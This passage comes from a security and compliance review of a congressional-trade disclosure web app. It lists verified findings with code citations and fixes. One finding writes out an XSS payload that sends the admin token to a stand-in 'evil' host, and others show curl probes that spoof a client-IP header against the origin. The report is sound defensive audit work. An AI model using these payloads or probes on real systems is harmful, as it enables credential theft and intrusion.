- **Fix:** Restrict origin ingress to Cloudflare: enable Authenticated Origin Pulls (mTLS) or move behind a Cloudflare Tunnel, and/or firewall 80/443 to Cloudflare IP ranges at Hetzner (the hetzner firewall API is available).  In app, only trust cf-connecting-ip when the peer is Cloudflare (Caddy `trusted_proxies` + a Caddy-set header) or when a shared secret header from the edge is present; make Caddy 301 http->https.
- **Evidence:** Re-run 2026-08-19: `curl -k -H 'Host: congress.trade' https://<PROD_ORIGIN_IP>/api/health` -> HTTP/2 200; plain `http://<PROD_ORIGIN_IP>/api/transactions?limit=1` (Host: congress.trade) -> 200 with no redirect_url; adding `cf-connecting-ip: 1.2.3.4` still 200 (header accepted, no proxy filter). `openssl s_client -servername congress.trade` on that IP: subject=CN=congress.trade, issuer Let's Encrypt. IP is published in docs/rollouts/2026-08-08-runners-hetzner-migration.md:12. app/src/shared/rateLimit.ts:230-231 `const cfIp = req.headers.get('cf-connecting-ip'); if (cfIp) return cfIp;` (comment at :221-223 assumes the header 'cannot be spoofed through the edge'); app/src/security/botDefense.ts:28-30 defers determined scrapers to Cloudflare WAF/Bot Management. Repo grep finds no trusted_proxies / Authenticated Origin Pulls / cloudflared config for the app origin.
- **Panel:** security-web — Reproduced all three probes (https 200, http 200 no redirect, spoofed cf-connecting-ip accepted) and the LE cert on the bare IP.  Code citations correct. · `security-web/SECURITYWEB-01`

#### 103. [P2] Anonymous visitors can activate the operator Review / Admin views via ?view=review, ?view=admin, /admin (or a stale ct-active-tab) — pages render but never load ('Loading…' forever, 6×401)

- **Where:** app/src/ui/dashboardHtml.ts:12807  ·  **Surface:** Web  ·  **Category:** bug  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** Deep links and the saved-tab restore bypass the admin gate that the tab click enforces, exposing operator UI shells to anyone and leaving them in a permanent loading state.
- **Impact:** Confusing dead pages for anyone who guesses the URL; operator internals (endpoint names, panels) exposed; stale `ct-active-tab=admin` after an operator logs out lands them on a broken view.
- **Fix:** In the boot resolver, if the target button has `data-admin-tab` and `!canUseAdmin()`, fall back to `trends` and call openLogin(); also never persist admin tabs to localStorage.  Ideally do not render admin markup for anonymous sessions at all.
- **Evidence:** origin/main dashboardHtml.ts confirmed exact: the boot resolver (starts at line 12751 `var initialView = 'trends';`) maps `/admin`→admin, `/review`→review and only checks `document.querySelector('nav.tabs button[data-view="' + canonicalView + '"]')` exists — no permission check. Downstream: line 12797 `if (initialView === 'review' && canUseAdmin()) loadReview();` (gated, so anonymous gets nothing) but line 12802 `if (initialView === 'admin') { initAdminToken(); loadLogoSetting(); loadHealth(); loadMarketCoverage(); loadDiagnostics(); loadBenchmarkHistory(); renderSpeedProof(); loadLlmSpendPanel(); loadExtractionIncident(); }` has NO `canUseAdmin()` guard — confirmed by direct read, this genuinely fires six-plus admin-only fetches for any anonymous visitor who lands on ?view=admin, and the tab is also marked `.active` and made visible (`initialBtn.classList.add('active')`) regardless of permission. The click path IS gated at line 12059 `if (b.getAttribute('data-admin-tab') === 'true' && !canUseAdmin() ...) { openLogin(); return; }` but the URL/boot path bypasses it entirely.
- **Panel:** qa-bughunt — Read the entire boot-resolver function (lines 12746-12810) in origin/main.  Confirmed the exact asymmetry claimed: initialView==='review' is canUseAdmin()-gated but initialView==='admin' is not, firing six unguarded admin loads for anonymous visitors. · merged: web-ux-desktop/WEBUXDESKTOP-17 · `qa-bughunt/QABUGHUNT-11`

#### 198. [P2] Admin review UI builds inline onclick handlers with esc()-escaped IDs — HTML escaping does not protect a JS string context

- **Where:** app/src/ui/dashboardHtml.ts:6056-6108, 6294  ·  **Surface:** Web · desktop  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Quick win**
- **What:** A docId such as `x');fetch('https://evil/?'+localStorage.adminToken)//` renders as `onclick="toggleModels('x&#39;);fetch(...)//')"`, which the browser evaluates as `toggleModels('x');fetch(...)//')` in the operator's browser and can read the localStorage ADMIN_TOKEN (SECURITYWEB-05).  Exploitability depends on an attacker influencing a filing document id (House numeric ids, Senate UUIDs, OGE, manual entry, scout handoff), so this is defense-in-depth rather than a live hole.
- **Impact:** Potential admin-token exfiltration through poisoned ingestion data.
- **Fix:** Replace inline handlers with `data-doc-id` attributes and delegated click listeners (as the public tables already do), and add a JS-string escaper (`JSON.stringify` + `&`/`<` escaping) for the few remaining cases.
- **Evidence:** app/src/ui/dashboardHtml.ts:5780 `'<button class="btn ghost sm" onclick="toggleModels(\\'' + esc(r.docId) + '\\')">'`, :5782 retryReviewAuto, :5819 viewReadings, :6015 useConsensusRows, :6337 meCancel — same pattern; esc() (dashboardHtml.ts:3814-3818) maps `'` -> `&#39;` but leaves `)` `;` `/` untouched, and the HTML attribute parser decodes `&#39;` back to `'` before the JS parser runs.
- **Panel:** security-web — Mechanism verified against esc() source and the cited lines.  No demonstration that any ingestion path lets an attacker choose a docId; keep as defense-in-depth. · `security-web/SECURITYWEB-13`

#### 259. [P3] Public /api/health discloses internal operational detail (build sha, backup keys, secrets sources, internal relay hostname)

- **Where:** app/src/delivery/rest.ts:492-520 (GET /api/health, /api/health/deep)  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The readiness probe doubles as an ops dashboard.  Attackers learn the exact deployed commit (maps to public repo history), the R2 backup naming scheme, the secret-manager topology, the internal Senate relay host, and pipeline weaknesses (dead-letter counts, degraded providers).
- **Impact:** Reconnaissance aid; internal hostnames and backup object names exposed to anyone.
- **Fix:** Return `{ok,status,time}` publicly; move the detailed payload to /api/admin/diagnostics (already exists) or gate /api/health/deep behind ADMIN_MAINTENANCE_TOKEN; keep uptime monitors on the minimal shape.
- **Evidence:** Re-run 2026-08-19 anonymous `curl https://congress.trade/api/health`: `build.sha e57f2f6e58b3b4b7d19cfab1697a55dd895c4974`, `checks.storage.r2Weekly.key weekly/congress-trade-20260816T181501Z.db`, `litestreamStatus replicating`, `checks.secrets.sources [{shared,65},{app,145}]`, `costProfile.cronSchedule '* * * * *'`, pipeline text mentions `scout.jays.services`, dead-letter count 80. Response header `access-control-allow-origin: *`. Handler app/src/delivery/rest.ts:474-533 (comment :471-473 explicitly makes cost profile public). Same body served from the direct origin (SECURITYWEB-01).
- **Panel:** security-web — Reproduced every field listed, plus CORS *. · merged: ops-reliability/OPSRELIABILITY-14, qa-bughunt/QABUGHUNT-31 · `security-web/SECURITYWEB-06`

#### 260. [P3] Unhandled-error handler echoes raw exception messages in JSON (and in HTML unless SENTRY_ENVIRONMENT==='production')

- **Where:** app/src/app.ts:33-40 (onError, unchanged); app/src/admin/routes.ts:5350-5363 (narrow fix, one route only)  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** SQLite/libsql, fetch and JSON errors carry table/column names, provider URLs and occasionally request payload fragments; every 500 hands that to the caller.  The HTML branch also injects err.message into markup without escaping.
- **Impact:** Stack/schema disclosure that speeds up injection and logic-bug hunting; inconsistent between JSON and HTML clients.
- **Fix:** Log the message server-side with a request id and return `{error:'internal error', requestId}`; gate detail on an explicit DEBUG_ERRORS=true rather than the Sentry env name; escape anything interpolated into the HTML branch.
- **Evidence:** app/src/app.ts:44 `return c.json({ error: err.message || 'Internal Server Error' }, 500);` (unconditional); app.ts:39 HTML branch interpolates `err.message` unescaped unless `c.env?.SENTRY_ENVIRONMENT === 'production'`. Production runs Deno with `#sentry` mapped to sentryDummy (deno.json:10).
- **Panel:** security-web — Lines are 39 (HTML) and 44 (JSON) on main, not 38/42; code otherwise as described.  Not triggered live (no known 500 path exercised). · `security-web/SECURITYWEB-07`

#### 261. [P3] Scrape guard (SCRAPE_GUARD_ENABLED) is off in production, so the UA blocklist, per-IP request budget and daily row budget are all dormant

- **Where:** publicApiGuard + GET /api/transactions  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The documented anti-bulk-extraction layers (UA blocklist, 300 req/5 min per IP, 3,000-row/day budget) are all inert in prod because SCRAPE_GUARD_ENABLED is not truthy.  Combined with SECURITYWEB-01 the only effective throttle today is the 2,000-row offset cap and the CSV export gate.  The code path is complete; this is a configuration/decision issue.
- **Impact:** Recent corpus is walkable at 250 rows/page with no budget; Premium 'bulk data' value proposition undercut.
- **Fix:** Decide explicitly: flip SCRAPE_GUARD_ENABLED=true in Infisical after checking iOS/EventSource UAs against the blocklist (or record why it stays off).  Add a smoke test/monitor that alerts when the guard is off in prod.
- **Evidence:** Re-run 2026-08-19: `curl -A 'curl/8.0' https://congress.trade/api/transactions?limit=1` -> 200; `-A 'python-requests/2.31'` -> 200; empty UA -> 200 (all would be 403 with the guard on, botDefense.ts:188-199). Only the unconditional depth cap works: offset=5000 -> 400. botDefense.ts:116-123 `scrapeGuardEnabled()` returns false when the secret is unset. Contrary to the raw finding, the REST pager DOES charge the budget: app/src/delivery/rest.ts:620-625 `checkRowBudget(c.env, ip)` and :695 `spendRowBudget(c.env, ip, transactions.length)` (added in 6c59124d), and the filing route at :925/:939 — the budget itself simply no-ops while the guard is off (rest.ts:610-611 comment).
- **Panel:** security-web — Guard-off half reproduced live.  The 'pager never charges the row budget' half is REFUTED (rest.ts:620-625/695 call it); title/description/recommendation rewritten accordingly. · `security-web/SECURITYWEB-11`

#### 323. [P3] Master ADMIN_TOKEN is pasted into the browser, stored in localStorage and re-populated into a password field

- **Where:** app/src/ui/dashboardHtml.ts:3215-3218  ·  **Surface:** Web · desktop  ·  **Category:** security  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The browser path uses the same long-lived, unscoped bearer that cron/agents use, persisted in a store readable by any script on the origin (CSP permits inline scripts) and by anyone with access to the profile.  A safer path already exists (Google session + ADMIN_EMAILS allowlist, or Cloudflare Access) but the token box is still the first thing the page offers.
- **Impact:** One XSS or one shared/automation Chrome profile leaks the production admin token indefinitely; token rotation is manual.
- **Fix:** In production hide the token box unless ADMIN_TOKEN_UI=true; rely on allowlisted Google session / CF Access for humans; if a token box must stay, mint short-lived scoped operator tokens server-side and store them in sessionStorage, and never re-fill the field from storage.
- **Evidence:** app/src/ui/dashboardHtml.ts:6804 `var ADMIN_TOKEN_KEY = 'congresstrade.adminToken';`, :6835 `localStorage.setItem(ADMIN_TOKEN_KEY, v)`, :6809-6813 `if (t) h['Authorization'] = 'Bearer ' + t;`, :6874-6877 `initAdminToken()` writes the stored token back into `#adminToken` (`<input id="adminToken" type="password" autocomplete="off">` at :3038). Server side the same value is the automation token (admin/routes.ts:374-379). desktop/admin.png shows the box rendered to an anonymous visitor; NOTES.md:78-83 records the token lingering in an automation Chrome profile and being cleared with clearAdminToken().
- **Panel:** security-web — All line citations verified (setItem is at :6835).  Screenshot confirms the box. · `security-web/SECURITYWEB-05`

#### 324. [P3] Full operator/admin UI (with internal endpoint names and instructions) is rendered to anonymous visitors

- **Where:** app/src/ui/dashboardHtml.ts (view=admin render path, unchanged)  ·  **Surface:** Web  ·  **Category:** security  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** The API is correctly gated, but the operator surface, its copy, its endpoint map and its controls ship in the public 715 KB document (also inflating every page load).  It also produces the '[DOM] Password field is not contained in a form' console line on every anonymous view (NOTES.md:148).
- **Impact:** Recon aid (endpoint inventory, internal vocabulary), phishing-friendly token box for anyone who lands on /admin, wasted bytes for every visitor.
- **Fix:** Split admin panels into a separate template/bundle served only when `/auth/me` returns admin.allowed (or a valid token header), and make /admin 302 to /?view=trends for non-admins.
- **Evidence:** desktop/admin.png (viewed): anonymous session shows Filing Latency Comparison + 'Admin Access' ADMIN_TOKEN box; desktop/admin-full.png / review-full.png show the full operator page; NOTES.md:51 records operator instructions naming `POST /api/admin/review/:docId {decision}`, `POST /api/admin/bakeoff`, `extraction_runs`. Live 2026-08-19: `curl https://congress.trade/` -> 715,277 bytes containing 71 occurrences of `api/admin/`. ui/routes.ts:182-183 serves the same DASHBOARD_HTML for `/` and `/admin`. Only the /api/admin/* calls 401.
- **Panel:** security-web — Screenshot and live byte/occurrence counts reproduced; ui/routes.ts lines are 182-183. · `security-web/SECURITYWEB-12`

#### 332. [P3] CSP allows 'unsafe-inline' scripts and styles, so any XSS in the 12k-line SPA is unmitigated

- **Where:** All HTML responses (browserSecurityHeadersMiddleware)  ·  **Surface:** Web  ·  **Category:** security  ·  **Effort:** L  ·  **Verdict:** confirmed (high confidence)
- **What:** The whole application (CSS+JS) is one inline template string, so the CSP must whitelist inline script.  That leaves the second line of defence absent: a single missed esc() (or a JS-context slip like SECURITYWEB-13) becomes full script execution, and because the admin bearer token is kept in localStorage (SECURITYWEB-05) an XSS on any public page can exfiltrate the master ADMIN_TOKEN.
- **Impact:** XSS blast radius = session + admin token theft; no nonce/hash containment.
- **Fix:** Move the app script to /assets/app.<hash>.js served from 'self', keep only a tiny nonce'd bootstrap inline, replace inline onclick= with delegated listeners, then set `script-src 'self' 'nonce-…' 'strict-dynamic'`.  Do styles second (`style-src` nonce or move to a stylesheet).
- **Evidence:** app/src/security/headers.ts:21 `"script-src 'self' 'unsafe-inline' https://static.cloudflareinsights.com"`, :22 `"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com"`; header comment :4-8 'Removing those two exceptions is the follow-up once the dashboard is split into nonceable/static assets'. Live header re-checked 2026-08-19 (identical to .review-shots/web/logs/headers.txt:16). grep counts in dashboardHtml.ts: 181 `innerHTML`, 132 `onclick=`.
- **Panel:** security-web — Header and code confirmed.  Corrected the status_vs_prior claim — no prior review filed this as a finding. · `security-web/SECURITYWEB-04`

#### 352. [P3] Magic-link verification is a side-effecting GET, so mail scanners/link previews consume the token and receive the session

- **Where:** app/src/auth/routes.ts:285-300  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Corporate/ISP mail security (Outlook Safe Links, Gmail previews, iOS Mail link previews) fetch links in the email body.  That fetch burns the one-time token (user then sees the '/?login=expired' toast) and the scanner's HTTP client is issued a valid ct_session cookie (and, with client=ios, a bearer token in the redirect Location).
- **Impact:** Login failures for users behind link scanners; sessions minted for third-party fetchers.
- **Fix:** Serve a static confirmation page on GET (no consumption) whose 'Continue' button POSTs the token, or require the requesting browser's short-lived cookie set at /auth/magic/request; keep the token hash-only storage as is.
- **Evidence:** app/src/auth/routes.ts:273-289 `r.get('/magic/verify', ...) const email = token ? await consumeMagicToken(c.env, token) : null; ... const sessionToken = await createSession(c.env, user.id); await setSessionCookie(c, sessionToken); ... c.redirect(...)`. Single-use consume in auth/magic.ts:22-34 (KV take/delete). Email body puts the raw URL in an <a> and as plain text (magic.ts:42-46).
- **Panel:** security-web — Code confirmed; behaviour of link scanners is well established but not reproduced here. · `security-web/SECURITYWEB-10`

#### 353. [P3] Public API default ordering surfaces 2020 seed_dataset ('seed-senate') rows first

- **Where:** app/src/delivery/rows.ts:769 (buildTransactionsQuery)  ·  **Surface:** Backend  ·  **Category:** data-correctness  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md P0-4)
- **What:** The rows are real historical disclosures mirrored from a community dataset, not fabricated fixtures, but they carry coarse provenance (no docId/filedDate) and are the first thing any API consumer or crawler sees when they omit sort.  The web/iOS clients request sort=tx_date&order=desc, so only raw API consumers see this.  Out of this lens; the 2026-08-10 review (P0-4) already noted 'Default API sample without UI sort returns 2020 seed rows first'.
- **Impact:** Trust/credibility of the public API and OpenAPI examples; unmerged seed filer ids (seed-senate-ron-l-wyden) leak legacy identities.
- **Fix:** Make the default sort tx_date desc (or published desc) for the public pager; finish the seed->primary filer id merge; expose `source` so consumers can filter seed_dataset rows.
- **Evidence:** Re-run 2026-08-19: `curl https://congress.trade/api/transactions?limit=5` -> first five rows `id seed_114e43131543c7b5…`, `docId 'seed-senate'`, filers `seed-senate-ron-l-wyden` / `senate-pat-roberts`, txDate 2020-11, filedDate null; total 89,864. Default sort is insertion cursor (delivery/rows.ts:448 `sort?: 'cursor' | 'published' | 'tx_date'`). Provenance: app/src/backfill/seed.ts:1-30 documents `source='seed_dataset'` rows imported from the community house/senate-stock-watcher S3 dumps ('LOW-FIDELITY half', no raw document, later upgraded by primary ingestion); scripts/dedupe_filers.ts:36-57 maps `seed-senate-*` filer ids to `senate-*`.
- **Panel:** security-web — Symptom reproduced live; corrected the 'possible fake trades' framing (documented seed_dataset imports) and the prior-status. · `security-web/SECURITYWEB-21`

#### 376. [P3] Webhook SSRF guard is TOCTOU on Deno (DoH pre-check vs system resolver at fetch time), but https-only + cert validation confine it to a connect-level probe

- **Where:** Webhook delivery (delivery/webhook.ts) and target validation (delivery/webhookTarget.ts)  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** M  ·  **Verdict:** plausible (medium confidence)
- **What:** An attacker with a Premium account can register a webhook whose DNS answers a public IP to 1.1.1.1 but an internal address (10.x, 172.16/12, 127.0.0.1) to the Hetzner resolver at delivery time.  Because targets must be https:// and Deno verifies certificates, the TLS handshake to a plain-HTTP or self-signed internal service fails before any HTTP bytes are sent, so this is not a body-delivering SSRF.  It remains a TCP-connect + TLS ClientHello probe against internal ports (timeout vs refused vs handshake failure) whose result is stored in last_error but is not visible to the attacker through any non-admin API, so there is no practical oracle today.  The stale Workers-flag comment is misleading about what protects the fetch.
- **Impact:** Latent SSRF-by-rebinding path with today's exploitability reduced to a blind internal connect; becomes real if a plain http:// target mode, cert-error tolerance, or user-visible delivery errors are ever added.
- **Fix:** Resolve once and connect to the validated address (DoH then fetch with the resolved IP pinned via a Deno custom resolver/connect option, or route webhook egress through a proxy that enforces the deny-list at connect time); restrict destination ports to 443; update the webhookTarget.ts comment to describe the Deno reality; keep https-only and never surface raw fetch errors to subscribers.
- **Evidence:** app/src/delivery/webhookTarget.ts:75-79 comment still relies on 'The Workers compatibility flag' as the rebinding backstop, but the app now runs on Deno behind Caddy (security/requestProtocol.ts:4-8). webhook.ts:414-432: `validatePublicWebhookTarget(...)` (DoH via cloudflare-dns.com, webhookTarget.ts:93-114) then `trackedFetch(sub.targetUrl, { method:'POST', redirect:'manual', ...})` which re-resolves through the host resolver. Mitigations present: webhookTarget.ts:32-66 requires `https:` for non-loopback targets and rejects IP literals; deno.json:7 start command has no `--unsafely-ignore-certificate-errors`, so Deno validates the server certificate against the attacker's SNI. Delivery `last_error` is written to `deliveries` (webhook.ts:627-645) and read only by admin routes (admin/routes.ts:3879,4174,4313,4447) — no client/public route exposes it.
- **Panel:** security-web — TOCTOU structure confirmed in code and the Workers backstop is indeed gone.  Downgraded: https-only + default Deno TLS verification blocks body delivery to internal plain-HTTP services, and the raw finding's 'Delivery tab oracle' is wrong — last_error is admin-only.  Not reproduced live (would require creating a subscription). · `security-web/SECURITYWEB-03`

#### 403. [P4] HSTS lacks includeSubDomains and preload

- **Where:** All responses  ·  **Surface:** Web  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Without includeSubDomains a first visit to a sibling host (e.g. admin.congress.trade) can be downgraded, and the domain is not on the browser preload list.
- **Impact:** Minor MITM window on first visit / subdomains.
- **Fix:** Audit zone hostnames, then set `max-age=31536000; includeSubDomains; preload` and submit to hstspreload.org.
- **Evidence:** Live 2026-08-19: `strict-transport-security: max-age=31536000`; app/src/security/headers.ts:47-49 comment 'Deliberately omit includeSubDomains/preload until every sibling hostname is audited'.
- **Panel:** security-web — Header and comment confirmed; the omission is a documented deliberate interim choice. · `security-web/SECURITYWEB-14`

#### 404. [P4] Admin audit 'actor' is taken from an unverified Cf-Access-Authenticated-User-Email header

- **Where:** admin/routes.ts adminActor()  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A bearer-token caller (or anyone at the direct origin, SECURITYWEB-01) can set that header to any email and have admin actions attributed to a colleague or to nobody in particular.
- **Impact:** Audit trail integrity.
- **Fix:** Derive the actor from the verified Access JWT email or the session email resolved in the gate; label bearer callers by token id.
- **Evidence:** app/src/admin/routes.ts:326-332 `const accessEmail = c.req.header('Cf-Access-Authenticated-User-Email') || c.req.header('cf-access-authenticated-user-email'); if (accessEmail) return accessEmail; return c.req.header('authorization') ? 'admin-token' : 'admin';` used for audit rows at :899, :2647, :2925, :3040. isAuthorized (:337-395) verifies the Access JWT, but the actor string is never tied to it.
- **Panel:** security-web — Code confirmed. · `security-web/SECURITYWEB-16`

#### 405. [P4] ADMIN_OPEN_IN_DEV 'production' detection relies on Sentry/usage env names rather than the deployment itself

- **Where:** admin/routes.ts isExplicitOpenAdmin  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** If a future prod environment forgets SENTRY_ENVIRONMENT (Sentry is a dummy on Deno) and USAGE_MONITOR_ENVIRONMENT, and admin credentials are momentarily unset, a stray ADMIN_OPEN_IN_DEV=true opens the entire admin API.  Guard-rail gap, not a live hole.
- **Impact:** Fail-open path under misconfiguration.
- **Fix:** Also require APP_BASE_URL to be a loopback origin (localWebhookTargetsAllowed already has this logic) before honouring ADMIN_OPEN_IN_DEV.
- **Evidence:** app/src/admin/routes.ts:317-324 `const isProduction = sentryEnvironment === 'production' || usageEnvironment === 'production'; return openInDev === 'true' && !isProduction;` invoked at :351-360 only when no ADMIN_TOKEN/allowlist/Access is configured. Live: /api/admin/* returns 401, so credentials are configured today.
- **Panel:** security-web — Code confirmed. · `security-web/SECURITYWEB-19`

#### 422. [P4] Session hardening gaps: no __Host- prefix, fixed 30-day TTL with no idle timeout, no 'sign out everywhere', no rotation

- **Where:** auth/session.ts  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** A stolen cookie or iOS bearer stays valid for the full 30 days; a user cannot revoke other devices; the OAuth state cookies already use `prefix: 'host'` (routes.ts:165) but the session cookie does not.
- **Impact:** Longer exposure after credential theft; no self-service revocation.
- **Fix:** Store `user:<id>:sessions` for revoke-all, add sliding expiry (e.g. 14d idle / 90d absolute), rotate the token on privilege change, and migrate to `__Host-ct_session`.
- **Evidence:** app/src/auth/session.ts:21-23 `SESSION_COOKIE = 'ct_session'; SESSION_TTL_SEC = 60*60*24*30; SESSION_PREFIX = 'sess:'`; :113-125 setSessionCookie (no `prefix`, `maxAge: SESSION_TTL_SEC`); :54-58 destroySession deletes only the presented token; no per-user session index exists (KV key is `sess:<token>` only).
- **Panel:** security-web — Code confirmed. · `security-web/SECURITYWEB-15`

#### 439. [P4] Cookie-authenticated mutations rely solely on SameSite=Lax; no Origin / Sec-Fetch-Site check or CSRF token

- **Where:** POST /api/subscriptions, POST /billing/checkout, POST /billing/portal, POST /auth/logout, admin POST/PUT/DELETE reached via Google session  ·  **Surface:** Web  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Lax blocks classic cross-site POST CSRF, and /api/subscriptions additionally requires an application/json body (a cross-site HTML form cannot produce one without a CORS preflight), so this is defense-in-depth only: same-site attackers (an XSS or subdomain takeover anywhere on *.congress.trade) can POST with the session cookie, including admin mutations for an allowlisted operator.
- **Impact:** Same-site CSRF against subscriptions/billing and, for operators, against the admin API — only if another same-site weakness exists.
- **Fix:** Add a middleware on all non-GET routes: reject when `Sec-Fetch-Site` is `cross-site`/`same-site`, or when `Origin` is present and != APP_BASE_URL origin (bearer-authenticated native clients skip it).
- **Evidence:** app/src/auth/session.ts:119-124 session cookie `sameSite: 'Lax'`; app/src/delivery/rest.ts:1222-1236 `r.post('/subscriptions' ...)` parses `c.req.json()` then `getCurrentUserFromRequest(c)` with no origin check; billing/routes.ts:106-107 and 235-236 same; admin/routes.ts:2093-2117 gate accepts `sessionEmail` from the cookie with no CSRF/origin check; `grep -rin sec-fetch-site app/src` hits only ingestion/senateSource.ts (outbound headers).
- **Panel:** security-web — Code confirmed; downgraded because the JSON-body requirement already defeats form-based CSRF and no same-site sibling weakness was demonstrated. · `security-web/SECURITYWEB-08`

#### 440. [P4] Premium-gated stored filing bytes are served with public/immutable caching and only HTML gets the sandbox CSP

- **Where:** GET /api/documents/:docId/pdf and /api/client/v1/documents/:docId/pdf  ·  **Surface:** Backend  ·  **Category:** security  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** `public` on an entitlement-gated response invites shared/proxy caching and keeps the document in the browser cache after logout; the sandbox is keyed on the stored content-type rather than applied to everything that is not a PDF.
- **Impact:** Minor entitlement leakage via caches; residual risk of active content from a third-party filing rendering in the app origin.
- **Fix:** Use `private, max-age=…` and apply `content-security-policy: sandbox` (or force `application/octet-stream` + attachment) for every non-PDF type.
- **Evidence:** app/src/delivery/rest.ts:1381 Premium check `if (!user || !(await isPremiumUserAsync(c.env, user)))`; :1400-1406 `'cache-control': 'public, max-age=86400, immutable'`; :1411-1413 `if (contentType.toLowerCase().includes('html')) headers['content-security-policy'] = 'sandbox';` — other third-party content types from R2 metadata render un-sandboxed. Routes mounted at rest.ts:950-951 and client/routes.ts:104.
- **Panel:** security-web — Code confirmed; whether any non-PDF/non-HTML content type is actually stored in R2 was not checked. · `security-web/SECURITYWEB-18`

#### 441. [P4] Runtime (Deno import map) and test (npm) dependency versions diverge — vitest exercises a different hono than production

- **Where:** app/deno.json vs app/package.json  ·  **Surface:** Backend  ·  **Category:** testing  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Security fixes in hono/cookie parsing, body limits, etc. are verified against one version and shipped with another; there is no automated audit of the Deno lockfile.
- **Impact:** Silent drift; audit blind spot for the production runtime.
- **Fix:** Pin identical versions in both files (or generate deno.json imports from package.json), and add a CI step that runs `deno audit`/osv-scanner on deno.lock.
- **Evidence:** app/deno.json:12 `"hono": "npm:hono@^4.12.31"` and deno.lock:15 resolves `4.12.31`; app/package.json:34 `"hono": "^4.13.1"` and package-lock.json:2757 resolves `4.13.1`. Also @aws-sdk/client-s3 3.1091.0 (deno.json:21) vs 3.1107.0 (package.json:29), unpdf ^1.6.2 (deno.json:15) vs ^1.8.0 (package.json:38). Note: deno.lock is currently modified in the working tree (uncommitted).
- **Panel:** security-web — Versions confirmed in both lockfiles. · `security-web/SECURITYWEB-20`

### Legal, licensing and disclosure (20)

No account deletion, no affiliation disclaimer, ToS and Privacy that predate Apple sign-in and IAP, and three third-party data/licence obligations (CC BY-SA photos, logo.dev, FMP) that are being carried without attribution.

#### 1. [P0] No account-deletion path anywhere (App Store 5.1.1(v), GDPR/CCPA erasure promised by Privacy §6)

- **Where:** iOS Account sheet (clients/ios/CongressTrade/Views/Settings/SettingsView.swift), web account menu, app/src/ui/legalHtml.ts:291  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md §3); tracked-in-PR-#1979 (BS-L3)
- **What:** The app supports account creation via Sign in with Apple and Google (and email magic link), but neither the iOS app nor the web app offers a way to initiate account deletion; the only path is an unstructured support email.  Apple App Store Review Guideline 5.1.1(v) requires apps that support account creation to let users initiate deletion from within the app.  The privacy policy promises deletion rights but there is no endpoint, runbook, or Stripe/Apple/Google deletion order.
- **Impact:** App Store rejection/removal risk on any future review; GDPR Art. 17 / CCPA deletion requests cannot be honoured reliably; privacy policy is making a promise the product cannot keep.
- **Fix:** Add `delete_account` client command + web route that: revokes sessions, cancels/detaches Stripe subscription or records Apple entitlement loss, deletes push_devices/subscriptions/watchlist/user_preferences rows, scrubs users row (or tombstones email hash), and revokes the Sign in with Apple token.  Surface 'Delete Account' in iOS Account sheet and web account menu.  Document a DSR runbook (identity check, 30-day SLA).
- **Evidence:** `git grep -rln -i 'deleteAccount|delete-account|account/delete|Delete Account|delete_account'` against origin/main app/src, clients/ios, app/docs returns nothing (re-run and confirmed at verification time, e57f2f6e). clients/ios/CongressTrade/Views/Status/SettingsView.swift on origin/main gained a 503-line diff since capture (adds an Admin panel) but no deletion affordance; only Sign Out exists. legalHtml.ts §6 promises 'you may have rights to access, correct, delete, or port your personal information … email support@congress.trade' (unchanged text, now at line ~291 on origin/main). clients/ios/IMPROVEMENT-PLAN.md:44 (2026-07-13) already lists 'an account-deletion route surfaced in-app' as a P0 exit criterion. migrations 0003/0004/0080 store users email/name/picture/google_sub/apple_sub/stripe ids; 0076 stores push_devices tokens; 0081 stores apple_subscriptions.
- **Panel:** legal-compliance — Reproduced the empty grep directly against current origin/main (e57f2f6e), 55 commits past the review's local checkout; SettingsView.swift's large intervening diff added only an Admin panel, no deletion path.  Stands as P0. · merged: app-store-compliance/APPSTORECOMPLIANCE-03, ios-engineering/IOSENGINEERING-02, ios-hig-ux/IOSHIGUX-04, ios-shipped-app/IOSSHIPPEDAPP-01, prior-review-followup/PRIORREVIEWFOLLOWUP-23 · `legal-compliance/LEGALCOMPLIANCE-01`

#### 24. [P1] Executive-branch (OGE 278-T) filings are redistributed in a paid product with no EIGA §105(c) posture, and ToS §1 still says Congress-only

- **Where:** app/src/ui/legalHtml.ts:186; app/src/ingestion/ogeSource.ts (unchanged)  ·  **Surface:** Cross-surface  ·  **Category:** compliance  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)  ·  **Status:** tracked-in-PR-#1979 (BS-E1, BS-L1)
